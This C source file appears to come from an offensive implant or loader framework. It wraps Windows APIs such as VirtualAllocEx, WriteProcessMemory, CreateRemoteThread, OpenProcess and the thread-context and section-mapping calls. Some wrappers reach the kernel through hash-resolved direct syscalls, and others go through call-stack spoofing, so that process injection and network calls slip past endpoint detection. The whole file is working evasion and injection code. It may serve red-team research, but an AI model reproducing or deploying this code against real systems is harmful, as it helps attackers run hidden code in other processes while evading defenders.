#include <windows.h>
#include <wininet.h>
#include <combaseapi.h>
#include "tcg.h"
#include "memory.h"
#include "spoof.h"
#include "syscalls.h"

DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetConnectA ( HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR );
DECLSPEC_IMPORT HINTERNET WINAPI WININET$InternetOpenA    ( LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD );

DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CreateProcessA        ( LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION );
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateRemoteThread    ( HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread          ( LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$RtlCaptureContext     ( PCONTEXT );

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance ( REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID * );

DECLSPEC_IMPORT ULONG  NTAPI  NTDLL$NtContinue ( CONTEXT *, BOOLEAN );

// Use utils\hash.py to generate these hashes
#define NTDLL_HASH                   0x3CFA685D
#define NTALLOCATEVIRTUALMEMORY_HASH 0xD33BCABD
#define NTFREEVIRTUALMEMORY_HASH     0xDB63B5AB
#define NTPROTECTVIRTUALMEMORY_HASH  0x8C394D89
#define NTQUERYVIRTUALMEMORY_HASH    0x4F138492
#define NTWRITEVIRTUALMEMORY_HASH    0xC5108CC2
#define NTREADVIRTUALMEMORY_HASH     0x3AEFA5AA
#define NTCLOSE_HASH                 0xDCD44C5F
#define NTOPENPROCESS_HASH           0xF0CA9CA0
#define NTOPENTHREAD_HASH            0x59651E8C
#define NTDUPLICATEOBJECT_HASH       0xB55C7785
#define NTCREATETHREADEX_HASH        0x4D1DEB74
#define NTGETCONTEXTTHREAD_HASH      0xE935E393
#define NTSETCONTEXTTHREAD_HASH      0x6935E395
#define NTRESUMETHREAD_HASH          0xC54A46C8
#define NTMAPVIEWOFSECTION_HASH      0xD5159B94
#define NTUNMAPVIEWOFSECTION_HASH    0xF21037D0
#define NTCREATESECTION_HASH         0x5BB29BCB

// NT structures and constants
#ifndef OBJ_INHERIT
#define OBJ_INHERIT 0x00000002
#endif

#ifndef SECTION_ALL_ACCESS
#define SECTION_ALL_ACCESS 0x000F001F
#endif

#ifndef SEC_COMMIT
#define SEC_COMMIT 0x08000000
#endif

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

// cannot put this here because it fails to build
// to PIC when hooks.x64.o is merged into the loader
// extern MEMORY_LAYOUT g_memory;

// Helper function to prepare NT syscalls - reduces code duplication
static inline BOOL prepare_nt_syscall ( DWORD moduleHash,  DWORD functionHash, SYSCALL * syscall ) 
{
    PVOID moduledll = findModuleByHash ( moduleHash );
    PVOID fn = findFunctionByHash ( moduledll, functionHash );
    
    if ( ! resolve_syscall ( syscall, moduledll, fn ) ) {
        return FALSE;
    }
    
    prepare_syscall ( syscall->ssn, syscall->gate );
    return TRUE;
}

HINTERNET WINAPI _InternetOpenA ( LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags )
{
    // NOTE: WinINet functions like InternetOpenA are high-level APIs with no direct NT syscall equivalents.
    // They internally use multiple syscalls and complex logic. Using Win API call with stack spoofing.
    FUNCTION_CALL call = { 0 };

    call.ptr        = ( PVOID ) ( WININET$InternetOpenA );
    call.argc       = 5;
    call.args [ 0 ] = spoof_arg ( lpszAgent );
    call.args [ 1 ] = spoof_arg ( dwAccessType );
    call.args [ 2 ] = spoof_arg ( lpszProxy );
    call.args [ 3 ] = spoof_arg ( lpszProxyBypass );
    call.args [ 4 ] = spoof_arg ( dwFlags );

    return ( HINTERNET ) spoof_call ( &call );
}

HINTERNET WINAPI _InternetConnectA ( HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext )
{
    // NOTE: WinINet functions like InternetConnectA are high-level APIs with no direct NT syscall equivalents.
    // They internally use multiple syscalls and complex logic. Using Win API call with stack spoofing.
    FUNCTION_CALL call = { 0 };

    call.ptr        = ( PVOID ) ( WININET$InternetConnectA );
    call.argc       = 8;
    call.args [ 0 ] = spoof_arg ( hInternet );
    call.args [ 1 ] = spoof_arg ( lpszServerName );
    call.args [ 2 ] = spoof_arg ( nServerPort );
    call.args [ 3 ] = spoof_arg ( lpszUserName );
    call.args [ 4 ] = spoof_arg ( lpszPassword );
    call.args [ 5 ] = spoof_arg ( dwService );
    call.args [ 6 ] = spoof_arg ( dwFlags );
    call.args [ 7 ] = spoof_arg ( dwContext );

    return ( HINTERNET ) spoof_call ( &call );
}

BOOL WINAPI _CloseHandle ( HANDLE hObject )
{
    SYSCALL syscall = { 0 };
    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTCLOSE_HASH, &syscall ) ) return FALSE;
    return ( NTSTATUS ) do_syscall ( hObject ) == 0;
}

HANDLE WINAPI _CreateFileMappingA ( HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName )
{
    SYSCALL syscall = { 0 };
    HANDLE hSection = NULL;
    LARGE_INTEGER maxSize;
    OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, 0, 0, 0, 0 };
    
    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTCREATESECTION_HASH, &syscall ) ) return NULL;
    
    maxSize.HighPart = dwMaximumSizeHigh;
    maxSize.LowPart = dwMaximumSizeLow;
    
    if ( ( NTSTATUS ) do_syscall ( &hSection, SECTION_ALL_ACCESS, &oa, &maxSize, flProtect, SEC_COMMIT, hFile ) == 0 ) {
        return hSection;
    }
    return NULL;
}

BOOL _CreateProcessA ( LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation )
{
    // NOTE: The NT syscall equivalent (NtCreateUserProcess) is extremely complex with numerous
    // structures and parameters that would be difficult to implement correctly.
    // Using Win API call with stack spoofing for simplicity and reliability.
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$CreateProcessA );
    call.argc = 10;

    call.args [ 0 ] = spoof_arg ( lpApplicationName );
    call.args [ 1 ] = spoof_arg ( lpCommandLine );
    call.args [ 2 ] = spoof_arg ( lpProcessAttributes );
    call.args [ 3 ] = spoof_arg ( lpThreadAttributes );
    call.args [ 4 ] = spoof_arg ( bInheritHandles );
    call.args [ 5 ] = spoof_arg ( dwCreationFlags );
    call.args [ 6 ] = spoof_arg ( lpEnvironment );
    call.args [ 7 ] = spoof_arg ( lpCurrentDirectory );
    call.args [ 8 ] = spoof_arg ( lpStartupInfo );
    call.args [ 9 ] = spoof_arg ( lpProcessInformation );

    return ( BOOL ) spoof_call ( &call );
}

HANDLE WINAPI _CreateRemoteThread ( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId )
{
    // NOTE: Attempted to convert to NtCreateThreadEx syscall but it didn't work properly.
    // The syscall implementation had issues with parameter ordering and flag conversion.
    // Reverting to Win API call with stack spoofing.
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$CreateRemoteThread );
    call.argc = 7;

    call.args [ 0 ] = spoof_arg ( hProcess );
    call.args [ 1 ] = spoof_arg ( lpThreadAttributes );
    call.args [ 2 ] = spoof_arg ( dwStackSize );
    call.args [ 3 ] = spoof_arg ( lpStartAddress );
    call.args [ 4 ] = spoof_arg ( lpParameter );
    call.args [ 5 ] = spoof_arg ( dwCreationFlags );
    call.args [ 6 ] = spoof_arg ( lpThreadId );

    return ( HANDLE ) spoof_call ( &call );
}

HANDLE WINAPI _CreateThread ( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId )
{
    // NOTE: Attempted to convert to NtCreateThreadEx syscall but it didn't work properly.
    // The syscall implementation had issues with parameter ordering and flag conversion.
    // Reverting to Win API call with stack spoofing.
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$CreateThread );
    call.argc = 6;
    
    call.args [ 0 ] = spoof_arg ( lpThreadAttributes );
    call.args [ 1 ] = spoof_arg ( dwStackSize );
    call.args [ 2 ] = spoof_arg ( lpStartAddress );
    call.args [ 3 ] = spoof_arg ( lpParameter );
    call.args [ 4 ] = spoof_arg ( dwCreationFlags );
    call.args [ 5 ] = spoof_arg ( lpThreadId );

    return ( HANDLE ) spoof_call ( &call );
}

HRESULT WINAPI _CoCreateInstance ( REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID * ppv )
{
    // NOTE: COM functions like CoCreateInstance have no direct NT syscall equivalents.
    // COM is a high-level framework built on top of many lower-level APIs.
    // Using Win API call with stack spoofing.
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( OLE32$CoCreateInstance );
    call.argc = 5;
    
    call.args [ 0 ] = spoof_arg ( rclsid );
    call.args [ 1 ] = spoof_arg ( pUnkOuter );
    call.args [ 2 ] = spoof_arg ( dwClsContext );
    call.args [ 3 ] = spoof_arg ( riid );
    call.args [ 4 ] = spoof_arg ( ppv );

    return ( HRESULT ) spoof_call ( &call );
}

BOOL WINAPI _DuplicateHandle ( HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions )
{
    SYSCALL syscall = { 0 };
    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTDUPLICATEOBJECT_HASH, &syscall ) ) return FALSE;
    return ( NTSTATUS ) do_syscall ( hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, bInheritHandle ? OBJ_INHERIT : 0, dwOptions ) == 0;
}

HMODULE WINAPI _LoadLibraryA ( LPCSTR lpLibFileName )
{
    // NOTE: LdrLoadDll is not a syscall - it's a regular exported function from ntdll.dll.
    // There is no direct NT syscall for loading libraries; LdrLoadDll itself uses multiple syscalls internally.
    // Using Win API call with stack spoofing.
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( LoadLibraryA );
    call.argc = 1;
    
    call.args [ 0 ] = spoof_arg ( lpLibFileName );

    return ( HMODULE ) spoof_call ( &call );
}

BOOL WINAPI _GetThreadContext ( HANDLE hThread, LPCONTEXT lpContext )
{
    SYSCALL syscall = { 0 };
    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTGETCONTEXTTHREAD_HASH, &syscall ) ) return FALSE;
    return ( NTSTATUS ) do_syscall ( hThread, lpContext ) == 0;
}

LPVOID WINAPI _MapViewOfFile ( HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap )
{
    SYSCALL syscall = { 0 };
    PVOID baseAddress = NULL;
    SIZE_T viewSize = dwNumberOfBytesToMap;
    LARGE_INTEGER sectionOffset;
    
    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTMAPVIEWOFSECTION_HASH, &syscall ) ) return NULL;
    
    sectionOffset.HighPart = dwFileOffsetHigh;
    sectionOffset.LowPart = dwFileOffsetLow;
    
    if ( ( NTSTATUS ) do_syscall ( hFileMappingObject, ( HANDLE ) ( -1 ), &baseAddress, 0, 0, &sectionOffset, &viewSize, 1, 0, PAGE_READWRITE ) == 0 ) {
        return baseAddress;
    }
    return NULL;
}

HANDLE WINAPI _OpenProcess ( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId )
{
    SYSCALL syscall = { 0 };
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, 0, 0, 0, 0 };
    CLIENT_ID cid = { (HANDLE)(DWORD_PTR)dwProcessId, 0 };

    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTOPENPROCESS_HASH, &syscall ) ) return NULL;
    do_syscall ( &hProcess, dwDesiredAccess, &oa, &cid );
    return hProcess;
}

HANDLE WINAPI _OpenThread ( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId )
{
    SYSCALL syscall = { 0 };
    HANDLE hThread = NULL;
    OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, 0, 0, 0, 0 };
    CLIENT_ID cid = { 0, (HANDLE)(DWORD_PTR)dwThreadId };

    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTOPENTHREAD_HASH, &syscall ) ) return NULL;
    do_syscall ( &hThread, dwDesiredAccess, &oa, &cid );
    return hThread;
}

BOOL WINAPI _ReadProcessMemory ( HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesRead )
{
    SYSCALL syscall = { 0 };
    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTREADVIRTUALMEMORY_HASH, &syscall ) ) return FALSE;
    return ( NTSTATUS ) do_syscall ( hProcess, (PVOID)lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead ) == 0;
}

DWORD WINAPI _ResumeThread ( HANDLE hThread )
{
    SYSCALL syscall = { 0 };
    ULONG suspendCount = 0;

    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTRESUMETHREAD_HASH, &syscall ) ) return (DWORD)-1;
    if ( ( NTSTATUS ) do_syscall ( hThread, &suspendCount ) == 0 ) return suspendCount;
    return (DWORD)-1;
}

BOOL WINAPI _SetThreadContext ( HANDLE hThread, const CONTEXT * lpContext )
{
    SYSCALL syscall = { 0 };
    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTSETCONTEXTTHREAD_HASH, &syscall ) ) return FALSE;
    return ( NTSTATUS ) do_syscall ( hThread, lpContext ) == 0;
}

BOOL WINAPI _UnmapViewOfFile ( LPCVOID lpBaseAddress )
{
    SYSCALL syscall = { 0 };
    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTUNMAPVIEWOFSECTION_HASH, &syscall ) ) return FALSE;
    return ( NTSTATUS ) do_syscall ( ( HANDLE ) ( -1 ), (PVOID)lpBaseAddress ) == 0;
}

LPVOID WINAPI _VirtualAlloc ( LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect )
{
    SYSCALL syscall = { 0 };
    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTALLOCATEVIRTUALMEMORY_HASH, &syscall ) ) return NULL;
    do_syscall ( ( HANDLE ) ( -1 ), &lpAddress, ( ULONG_PTR ) ( 0 ), &dwSize, flAllocationType, flProtect );
    return lpAddress;
}

LPVOID WINAPI _VirtualAllocEx ( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect )
{
    SYSCALL syscall = { 0 };
    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTALLOCATEVIRTUALMEMORY_HASH, &syscall ) ) return NULL;
    do_syscall ( hProcess, &lpAddress, ( ULONG_PTR ) ( 0 ), &dwSize, flAllocationType, flProtect );
    return lpAddress;
}

BOOL WINAPI _VirtualFree ( LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType )
{
    SYSCALL syscall = { 0 };
    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTFREEVIRTUALMEMORY_HASH, &syscall ) ) return FALSE;
    return ( NTSTATUS ) do_syscall ( ( HANDLE ) ( -1 ), &lpAddress, &dwSize, dwFreeType ) == 0;
}

BOOL WINAPI _VirtualProtect ( LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect )
{
    SYSCALL syscall = { 0 };
    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTPROTECTVIRTUALMEMORY_HASH, &syscall ) ) return FALSE;
    return ( NTSTATUS ) do_syscall ( ( HANDLE ) ( -1 ), &lpAddress, &dwSize, flNewProtect, lpflOldProtect ) == 0;
}

BOOL WINAPI _VirtualProtectEx ( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect )
{
    SYSCALL syscall = { 0 };
    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTPROTECTVIRTUALMEMORY_HASH, &syscall ) ) return FALSE;
    return ( NTSTATUS ) do_syscall ( hProcess, &lpAddress, &dwSize, flNewProtect, lpflOldProtect ) == 0;
}

SIZE_T WINAPI _VirtualQuery ( LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength )
{
    SYSCALL syscall = { 0 };
    SIZE_T returnLength = 0;

    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTQUERYVIRTUALMEMORY_HASH, &syscall ) ) return 0;
    if ( ( NTSTATUS ) do_syscall ( ( HANDLE ) ( -1 ), (PVOID)lpAddress, 0, lpBuffer, dwLength, &returnLength ) == 0 ) {
        return returnLength;
    }
    return 0;
}

BOOL WINAPI _WriteProcessMemory ( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten )
{
    SYSCALL syscall = { 0 };
    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTWRITEVIRTUALMEMORY_HASH, &syscall ) ) return FALSE;
    return ( NTSTATUS ) do_syscall ( hProcess, lpBaseAddress, (PVOID)lpBuffer, nSize, lpNumberOfBytesWritten ) == 0;
}
